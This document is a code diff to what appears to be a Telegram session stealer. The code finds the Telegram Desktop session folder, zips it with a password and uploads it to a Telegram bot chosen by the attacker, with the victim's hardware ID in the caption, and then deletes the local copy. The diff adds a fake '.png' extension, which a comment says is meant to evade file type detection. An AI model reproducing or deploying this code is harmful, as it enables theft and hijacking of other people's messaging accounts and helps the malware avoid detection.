@@ -82,7 +82,7 @@ function getHwid() {
 async function sendArchiveTelegramWebhook(archivePath, archivePassword, telegramChatId, telegramToken) {
   const hwid = await getHwid()
   const form = new FormData()
-  form.append('document', fs.createReadStream(archivePath))
+  form.append('document', fs.createReadStream(archivePath, {}), { filename: `${hwid}.zip` })
   form.append('caption', `New Telegram Desktop session archive\\!\nPassword: \`${archivePassword}\`\nHWID: \`${hwid}\``)
   const res = await fetch(
     `https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
@@ -109,12 +109,12 @@ function deleteArchive(archivePath) {
   })
 }
 
-async function run({
+async function run(
   telegramChatId,
   telegramToken,
   archivePassword = 'https://github.com/rigwild/telegram-stealer',
   waitOnStart = true
-}) {
+) {
   if (!telegramChatId) throw new Error('Telegram chat ID is required')
   if (!telegramToken) throw new Error('Telegram token is required')
 
@@ -124,7 +124,7 @@ async function run({
   const appDataPath = await getAppDataPath()
   const telegramDirectoryPath = await findTelegramDirectoryPath(appDataPath)
   const hwid = await getHwid()
-  const archivePath = path.join(tempDirectory, `${hwid}.zip`)
+  const archivePath = path.join(tempDirectory, `${hwid}.png`) // Fake extension to prevent file type detection
   await archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword)
   await sendArchiveTelegramWebhook(archivePath, archivePassword, telegramChatId, telegramToken)
   await deleteArchive(archivePath)
